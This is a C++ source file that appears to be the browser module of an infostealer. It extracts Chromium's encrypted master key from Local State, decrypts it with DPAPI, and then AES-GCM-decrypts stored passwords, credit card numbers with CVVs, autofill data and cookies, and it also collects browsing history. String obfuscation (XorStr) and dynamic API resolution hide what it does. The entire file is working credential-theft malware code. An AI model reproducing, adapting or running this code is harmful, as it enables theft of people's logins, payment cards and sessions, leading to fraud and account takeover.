#include "Common.h"

void Chromium::GetEncKey()
{
	string keyPath;
	if (this->path.find(XorStr("Opera")) != string::npos)
	{
		keyPath = this->path.substr(0, this->path.find_last_of(XorStr("\\"))) + XorStr("\\Local State");
		DEBUG("Opera key path: %s", keyPath.c_str())
	}
	else
	{
		keyPath = this->path.substr(0, this->path.find(XorStr("User Data\\"))) + XorStr("User Data\\Local State");
		DEBUG("Key path: %s", keyPath.c_str())
	}

	string keyFile;
	Utils::ReadAllText(keyPath, keyFile);
	DEBUG("Reading key file...")

	if (!keyFile.empty())
	{
		DEBUG("Key readed")
		size_t first = keyFile.find(XorStr("\"encrypted_key\":\""));
		size_t last = keyFile.find(XorStr("\"},\"password_manager\""));
		if (first == string::npos) return;
		if (last == string::npos) last = keyFile.find(XorStr("\"},\"partner_content\""));
		if (last == string::npos) return;

		// выдираем ключ из файла Local State
		string strNew = keyFile.substr(first, last - first);
		if (strNew.empty()) return;

		string keyBase64 = strNew.replace(strNew.find(XorStr("\"encrypted_key\":\"")), 17, "");

		// расшифровываем base64, получаем ключ в DPAPI
		string keyDPAPI = base64_decode(keyBase64);
		if (keyDPAPI.empty()) return;

		string key = keyDPAPI.replace(keyDPAPI.find(XorStr("DPAPI")), 5, "");
		if (key.empty()) return;

		// расшифровываем DPAPI
		this->encKey = Utils::DecryptStr(key);
		DEBUG("Key getted")
	}

	return;
}

string Chromium::DecryptAES(string bytes)
{
	if (this->encKey.empty()) return string();
	
	const size_t keySize = this->encKey.size();

	BCRYPT_ALG_HANDLE hAlg;
	if (API(BCRYPT, BCryptOpenAlgorithmProvider)(&hAlg, XorStrW(BCRYPT_AES_ALGORITHM), NULL, 0) != 0) return string();

	if (API(BCRYPT, BCryptSetProperty)(hAlg, XorStrW(BCRYPT_CHAINING_MODE), (PUCHAR)XorStrW(BCRYPT_CHAIN_MODE_GCM), sizeof(BCRYPT_CHAIN_MODE_GCM), 0) != 0)
		return string();

	BCRYPT_KEY_HANDLE hKey;
	if (API(BCRYPT, BCryptGenerateSymmetricKey)(hAlg, &hKey, NULL, 0, (PUCHAR)encKey.c_str(), keySize, 0) != 0) return string();


	BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO BACMI;
	memset(&BACMI, 0, sizeof(BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO));
	BACMI.cbSize = sizeof(BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO);
	BACMI.dwInfoVersion = BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO_VERSION;
	BACMI.pbNonce = (PUCHAR)(bytes.c_str() + 3); // пропускаем префикс v10/v11
	BACMI.cbNonce = 12; // размер Nonce = 12 байт
	BACMI.pbTag = (PUCHAR)(bytes.c_str() + bytes.size() - 16);
	BACMI.cbTag = 16;

	char* pbOutput = new char[1024];
	memset(pbOutput, 0, 1024);
	ULONG cbOutput = 1024;
	ULONG cbCiphertext = 0;

	if (API(BCRYPT, BCryptDecrypt)(hKey, (PUCHAR)(bytes.c_str() + 15), bytes.size() - 15 - 16, &BACMI, NULL, 0, (PUCHAR)pbOutput, cbOutput, &cbCiphertext, 0))
	{
		return string();
	}
	return pbOutput;
}

void Chromium::GetPasswords()
{
	if (Utils::IsFileExist(this->tempDbPath)) API(KERNEL32, DeleteFileA)(this->tempDbPath.c_str());

	bool b = false;
	SqlHandler* sql = new SqlHandler(this->path, b, this->tempDbPath);
	if (b && sql->ReadTable(XorStr("logins")))
	{
		for (int i = 0; i < sql->GetRowCount(); i++)
		{
			ChromiumData::PassData tempData;
			tempData.Url = sql->GetValue(i, 0);
			tempData.Login = sql->GetValue(i, 3);

			const string encryptedPass = sql->GetValue(i, 5);
			if (encryptedPass.empty()) continue;

			if (encryptedPass[0] == 'v' && encryptedPass[1] == '1')
			{
				tempData.Password = DecryptAES(encryptedPass);
			}
			else
			{
				tempData.Password = Utils::DecryptStr(encryptedPass);
			}

			this->passData.push_back(tempData);
		}
	}

	delete sql;
}

void Chromium::GetCards()
{
	if (Utils::IsFileExist(this->tempDbPath)) API(KERNEL32, DeleteFileA)(this->tempDbPath.c_str());

	bool b;
	SqlHandler* sql = new SqlHandler(this->path, b, this->tempDbPath);
	if (b && sql->ReadTable(XorStr("credit_cards")))
	{
		for (int i = 0; i < sql->GetRowCount(); i++)
		{
			ChromiumData::CardData tempData;

			string card_num = sql->GetValue(i, 4);
			if (card_num[0] == 'v' && card_num[1] == '1')
			{
				tempData.Number = DecryptAES(card_num);
			}
			else
			{
				tempData.Number = Utils::DecryptStr(card_num);
			}

			tempData.Cvv = sql->GetValue(i, 9);
			tempData.Date = sql->GetValue(i, 2) + '/' + sql->GetValue(i, 3);

			string cardName = sql->GetValue(i, 1);
			if (cardName[0] == 'v' && card_num[1] == '1')
			{
				tempData.Name = DecryptAES(card_num);
			}
			else
			{
				tempData.Name = cardName;
			}

			tempData.Url = sql->GetValue(i, 6);

			this->cardData.push_back(tempData);
		}
	}

	delete sql;
}

void Chromium::GetForms()
{
	if (Utils::IsFileExist(this->tempDbPath)) API(KERNEL32, DeleteFileA)(this->tempDbPath.c_str());

	bool b;
	SqlHandler* sql = new SqlHandler(this->path, b, this->tempDbPath);
	if (b && sql->ReadTable(XorStr("autofill")))
	{
		for (int i = 0; i < sql->GetRowCount(); i++)
		{
			if (this->path.find(XorStr("Edge")) != string::npos)
			{
				ChromiumData::FormData tempData;
				tempData.Name = sql->GetValue(i, 1);
				tempData.Value = DecryptAES(sql->GetValue(i, 2));
				this->formData.push_back(tempData);
			}
			else
			{
				ChromiumData::FormData tempData;
				tempData.Name = sql->GetValue(i, 0);
				tempData.Value = sql->GetValue(i, 1);
				this->formData.push_back(tempData);
			}
		}
	}
	delete sql;
}

void Chromium::GetCookies()
{
	if (Utils::IsFileExist(this->tempDbPath)) API(KERNEL32, DeleteFileA)(this->tempDbPath.c_str());

	bool b;
	SqlHandler* sql = new SqlHandler(this->path, b, this->tempDbPath);
	DEBUG("Getting cookies...")
	if (b && sql->ReadTable(XorStr("cookies")))
	{
		DEBUG("cookies table readed...")
		for (int i = 0; i < sql->GetRowCount(); ++i)
		{
			ChromiumData::CookieData tempData;
			string encrypted_value = sql->GetValue(i, 12); // encrypted_value
			if (encrypted_value[0] == 'v' && encrypted_value[1] == '1')
			{
				tempData.Value = DecryptAES(encrypted_value);
			}
			else
			{
				tempData.Value = Utils::DecryptStr(encrypted_value);
			}

			if (!tempData.Value.empty())
			{
				tempData.Host = sql->GetValue(i, 1); // host_key
				tempData.Path = sql->GetValue(i, 4); // path
				string expires_utc = sql->GetValue(i, 5); // expires_utc
				tempData.Timestamp = expires_utc == XorStr("0") ? XorStr("1830365600") : std::to_string(Utils::ToUnixTimeStamp(Utils::str2ull(expires_utc)));
				tempData.Name =  sql->GetValue(i, 2); // name
				this->cookieData.push_back(tempData);
			}
		}
	}
	delete sql;
}

void Chromium::GetHistory()
{
	if (Utils::IsFileExist(this->tempDbPath)) API(KERNEL32, DeleteFileA)(this->tempDbPath.c_str());

	bool b;
	SqlHandler* sql = new SqlHandler(this->path, b, this->tempDbPath);
	if (b && sql->ReadTable(XorStr("urls")))
	{
		for (int i = 0; i < sql->GetRowCount(); i++)
		{
			ChromiumData::HistoryData tempData;
			tempData.Url = sql->GetValue(i, 1);
			tempData.Title = sql->GetValue(i, 2);
			this->historyData.push_back(tempData);
		}
	}
	delete sql;
}